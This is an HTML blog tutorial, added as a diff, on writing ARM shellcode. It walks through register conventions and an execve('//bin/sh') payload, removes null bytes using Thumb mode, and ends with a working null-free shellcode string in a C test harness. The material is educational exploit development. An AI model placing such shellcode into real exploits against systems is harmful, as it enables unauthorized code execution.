@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>anwarelmakrahy | ARM Architecture Shellcoding</title>
+    <meta name="Description" content=" Anwar Mohamed's security corner." />
+    <meta name="Viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Author" content="Anwar Mohamed"/>
+    <meta name="Robots" content="index,follow"/>
+
+    <link rel="index" title="anwarelmakrahy.localhost" href="http://anwarelmakrahy.com"/>
+
+    <link rel="stylesheet" href="../css/perldoc.css"/>
+    <link rel="stylesheet" href="../css/styles.css"/>
+    <link rel="stylesheet" href="../css/bootstrap.css"/>
+
+    <link rel="alternate" type="application/rss+xml" title="anwarelmakrahy's feed" href="rss.xml"/>
+    <link rel="icon" type="image/x-ico" href="../favicon.ico"/>
+
+    <style>
+      .profile {
+        text-align: center;
+      }
+      .profile ul {
+        text-align: left;
+        list-style: none;
+        margin-top: 10px;
+      }
+      .profile li a {
+        padding-left: 6px;
+        color: #333333;
+      }
+      .profile a {
+        color: #333333;
+      }
+      .profile h4 a:hover {
+        text-decoration: none;
+      }
+      body {
+        padding-top: 60px; 
+      }
+      p {
+        text-align: justify;
+      }
+    </style>
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+          <div class="nav-collapse collapse">
+            <ul class="nav pull-left">
+        <li><a href="http://anwarelmakrahy.com/"><b>anwarelmakrahy.localhost</b></a></li>
+        <!--<li><a href="#">Test</a></li>-->
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <p>&nbsp;</p>
+    <div class="container">      
+            <div class="span2 profile">
+                <h4><a target="_blank" href="https://twitter.com/anwarelmakrahy">Anwar Mohamed</a></h4>
+                <center>
+                <img width="110" height="105" alt="" src="../img/anwar.jpeg" />
+                </center>
+                <p>&nbsp;</p>
+                <ul>
+                    <li><i class="icon-user"></i><a target="_blank" href="https://twitter.com/anwarelmakrahy">Twitter Profile</a></li>
+                    <li><i class="icon-user"></i><a target="_blank" href="https://github.com/AnwarMohamed">GitHub Profile</a></li>
+                    <li><i class="icon-user"></i><a target="_blank" href="https://www.quora.com/Anwar-Mohamed-1">Quora Profile</a></li>
+                    <li><i class="icon-user"></i><a target="_blank" href="https://www.linkedin.com/pub/anwar-mohamed/88/32b/44b">Linkedin Profile</a></li>
+                    <!--<li><i class="icon-globe"></i><a target="_blank" href="rss.xml">RSS feeds</a></li>-->
+                    <li><i class="icon-envelope"></i><a target="_blank" href="mailto:anwarelmakrahy@gmail.com">Email</a></li>
+                </ul>
+            </div>
+            <div class="span8">
+            <!--Body content-->
+      
+  <h2>ARM Architecture Shellcoding</h2>
+  by <a target="_blank" href="http://twitter.com/anwarelmakrahy">Anwar Mohamed</a> - 06-09-2014
+  <span class="label"></span><hr>
+
+  <h4>Introduction to the ARM architecture</h4>
+  <p>ARM is a family of instruction set architectures for computer processors based on a reduced instruction set computing (RISC) architecture developed by British company ARM Holdings. Also it is the most widely used 32-bit instruction set architecture.</p>
+
+  <p>For a list of the ARM processor cores and handsets built on them, have a look at this <a target="_blank" href="http://en.wikipedia.org/wiki/List_of_applications_of_ARM_cores.">link</a></p>
+
+  <p>ARM architecture today has some features that were derived from the old Berkeley RISC including a load-store architecture, fixed length 32-bit instructions and 3-address instruction formats.</p>
+
+  <p>The ARM architecture is also the most present in the field of Mobile Computing. Numerous operating systems have been ported to that architecture including Linux (Used by Android), iOS (Used by iPhone & iPad) and Windows Phone 8 (Used by many Nokia-Lumia smartphones).</p>
+  
+  <p>&nbsp;</p>
+  <h4>Register conventions</h4>
+
+  <div class="codehilite"><pre>
+Register    Alt. Name       Usage
+r0          a1              First function argument Integer function result Scratch register
+r1          a2              Second function argument Scratch register
+r2          a3              Third function argument Scratch register
+r3          a4              Fourth function argument Scratch register
+
+r4          v1              Register variable
+r5          v2              Register variable
+r6          v3              Register variable
+r7          v4              Register variable
+r8          v5              Register variable
+r9          v6
+rfp                         Register variable Real frame pointer
+
+r10         sl              Stack limit
+r11         fp              Argument pointer
+r12         ip              Temporary workspace
+r13         sp              Stack pointer
+r14         lr              Link register Workspace
+r15         pc              Program counter</pre></div>
+  
+  <p>Out of the 16 accessible registers there are 11 general-purpose registers and 5 special purpose registers, which are assigned specific names.</p>
+
+  <p style="margin:0;padding:0;"><strong>R11</strong> is the frame pointer and holds the pointer to the current stack frame.</p>
+  <p style="margin:0;padding:0;"><strong>R12</strong> is the Intra-procedure call scratch register used by a subroutine to store temporary data.</p>
+  <p style="margin:0;padding:0;"><strong>R13</strong> is the stack pointer and holds the pointer to the top of the stack.</p>
+  <p style="margin:0;padding:0;"><strong>R14</strong> is the link register holds the return addresses whenever a subroutine is called with a branch and link instruction.</p>
+  <p><strong>R15</strong> is the program counter and holds the address of the next instruction to be executed.</p>
+  <p>The arguments of a function are stored in registers <strong>r0</strong> to <strong>r3</strong>. If the number of arguments is greater than 3 then the excess arguments are stored onto the stack.</p>
+  
+  <p style="margin:0;padding:0;">Let's start by writing a shellcode called execve(). We first need to know the address of the syscall.</p>
+  <p>Note that we are using a Raspberry Pi to demonstrate this article.</p>
+
+
+  <div class="codehilite"><pre>
+~# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep execve
+#define __NR_execve       (__NR_SYSCALL_BASE+ 11)
+#define __NR_kexec_load   (__NR_SYSCALL_BASE+347)</pre></div>
+  
+  <p>We have <strong>11</strong> for <strong>_execve</strong>. We know that <strong>_execve</strong> consumes three arguments:</p>
+
+  <div class="codehilite"><pre>
+execve(const char *filename, char *const argv[], char *const envp[])</pre></div>
+
+  <p>Which gives us:</p>
+
+  <div class="codehilite"><pre>
+r0 => "//bin/sh\0"
+r1 => "//bin/sh\0"
+r2 => 0
+r7 => 11
+
+~# cat shell.s
+.section .text
+.global _start
+_start:
+        mov r0,   pc        // place the address of pc in r0
+        add r0,   #20       // add 20 to it (which then makes it point to //bin/sh)
+        str r0,   [sp, #4]  // place it on the stack
+        add r1,   sp, #4    // move what was on the stack to r1
+        sub r2,   r2, r2    // subtract r2 from itself (which is the same as placing 0 in r2)
+        mov r7,   #11       // syscall execve in r7
+        svc 0               // execute
+
+.ascii "//bin/sh\0"
+
+~# as -o shell.o shell.s
+~# ld -o shell shell.o
+~# ./shell
+~# exit
+~#
+~# strace ./shell
+execve("./shell", ["./shell"], [/* 15 vars */]) = 0
+execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0</pre></div>
+
+    <p>It worked however in order create our shellcode, we should have no null bytes, and our shellcode has many of them.</p>
+
+    <div class="codehilite"><pre>
+~# objdump -d shell
+shell:
+  file format elf32-littlearm
+  Disassembly of section .text:
+      
+      00008054 <_start>:
+        8054: e1a0000f  mov    r0, pc
+        8058: e2800014  add    r0, r0, #20
+        805c: e58d0004  str    r0, [sp, #4]
+        8060: e28d1004  add    r1, sp, #4
+        8064: e0422002  sub    r2, r2, r2
+        8068: e3a0700b  mov    r7, #11
+        806c: ef000000  svc    0x00000000
+        8070: 69622f2f  .word  0x69622f2f
+        8074: 68732f6e  .word  0x68732f6e
+        8078: 00        .byte  0x00
+        8079: 00        .byte  0x00</pre></div>
+
+    <p>Under ARM, we have the <strong>THUMB MODE</strong> which allows us to use 16 bits addressing for our calls as opposed to 32 bits, which does simplify our life at this stage.</p>
+
+    <div class="codehilite"><pre>
+~# cat shell.s
+.section .text
+.global _start
+_start:
+      .code 32     
+      add   r6, pc, #1
+      bx    r6
+      
+      .code 16
+      mov   r0, pc
+      add   r0, #10
+      str   r0, [sp, #4]
+      add   r1, sp, #4
+      sub   r2, r2, r2
+      mov   r7, #11
+      svc   0
+
+.ascii "//bin/sh\0"
+
+~# as -mthumb -o shell.o shell.s
+~# ld -o shell shell.o
+~# ./shell</pre></div>
+
+    <p>When compiling, use "<strong>-mthumb</strong>" to indicate that we are switching to "<strong>Thumb Mode</strong>". The value of the constant being added to <strong>r0</strong> was changed. Instead of the original "<strong>add r0, #20</strong>", We are doing "<strong>add r0, #10</strong>" since we have now switched to "<strong>thumb mode</strong>", the address where our chain is at, has been halved.</p>
+
+    <div class="codehilite"><pre>
+~# objdump -d shell
+shell:
+  file format elf32-littlearm
+  Disassembly of section .text:
+
+    00008054 <_start>:
+      8054: e28f6001  add   r6, pc, #1
+      8058: e12fff16  bx    r6
+      805c: 4678      mov   r0, pc
+      805e: 300a      adds  r0, #10
+      8060: 9001      str   r0, [sp, #4]
+      8062: a901      add   r1, sp, #4
+      8064: 1a92      subs  r2, r2, r2
+      8066: 270b      movs  r7, #11
+      8068: df00      svc   0
+      806a: 2f2f      .short 0x2f2f
+      806c: 2f6e6962  .word  0x2f6e6962
+      8070: 6873      .short 0x6873</pre></div>
+
+    <p>So now we have to modify the following instruction: "<strong>svc 0</strong>". For SVC we will use "<strong>svc 1</strong>" which is perfect in this case.</p>
+
+    <div class="codehilite"><pre>
+~# cat shell.s
+.section .text
+.global _start
+_start:
+      .code 32
+      add   r6, pc, #1
+      bx    r6
+      
+      .code 16
+      mov   r0, pc
+      add   r0, #10
+      str   r0, [sp, #4]
+      add   r1, sp, #4
+      sub   r2, r2, r2
+      mov   r7, #11
+      svc   1
+
+.ascii "//bin/sh\0"
+
+~# as -mthumb -o shell.o shell.s
+~# ld -o shell shell.o
+~# strace ./shell
+execve("./shell", ["./shell"], [/* 15 vars */]) = 0
+execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
+~# exit
+~#
+~# objdump -d shell
+shell:
+  file format elf32-littlearm
+  Disassembly of section .text:
+
+    00008054 <_start>:
+      8054: e28f6001  add   r6, pc, #1
+      8058: e12fff16  bx    r6
+      805c: 4678      mov   r0, pc
+      805e: 300a      adds  r0, #10
+      8060: 9001      str   r0, [sp, #4]
+      8062: a901      add   r1, sp, #4
+      8064: 1a92      subs  r2, r2, r2
+      8066: 270b      movs  r7, #11
+      8068: df01      svc   1
+      806a: 2f2f      .short 0x2f2f
+      806c: 2f6e6962  .word  0x2f6e6962
+      8070: 6873      .short 0x6873</pre></div>
+
+    <p>Here we are, we have got an operational shellcode without any null bytes. In C that gives us:</p>
+
+    <div class="codehilite"><pre>
+~# cat shell.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char *shellcode =
+        "\x01\x60\x8f\xe2"
+        "\x16\xff\x2f\xe1"
+        "\x78\x46"
+        "\x0a\x30"
+        "\x01\x90"
+        "\x01\xa9"
+        "\x92\x1a"
+        "\x0b\x27"
+        "\x01\xdf"
+        "\x2f\x2f"
+        "\x62\x69\x6e\x2f"
+        "\x73\x68";
+
+int main()
+{
+  (*(void(*)()) shellcode)();
+  return 0;
+}
+
+~# gcc -o shell shell.c
+~# ./shell
+$
+$</pre></div>
+
+  <p>&nbsp;</p>
+  <h4>References</h4>
+  <ol>
+    <li>The ARM Instruction Set</li>
+    <li>Introduction to ARM Exploitation</li>
+    <li>Shellstorm - Shellcoding in ARM Architecture</li>
+  </ol>
+
+      <p>&nbsp;</p>
+    </div> <!-- /container -->
+    </div>
+
+   <footer class="footer">
+      <div class="container">
+        <p class="text-center">anwarelmakarahy - 2014</p>
+        <ul class="footer-links">
+          <!--<li><a target="_blank" href="rss.xml">RSS</a></li>
+          <li class="muted">&middot;</li>-->
+          <li><a target="_blank" href="https://twitter.com/anwarelmakrahy">Twitter</a></li>
+          <li class="muted">&middot;</li>
+          <li><a target="_blank" href="https://github.com/AnwarMohamed">Github</a></li>
+        </ul>
+      </div>
+    </footer>
+
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-53791622-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+
+  </body>
+</html>
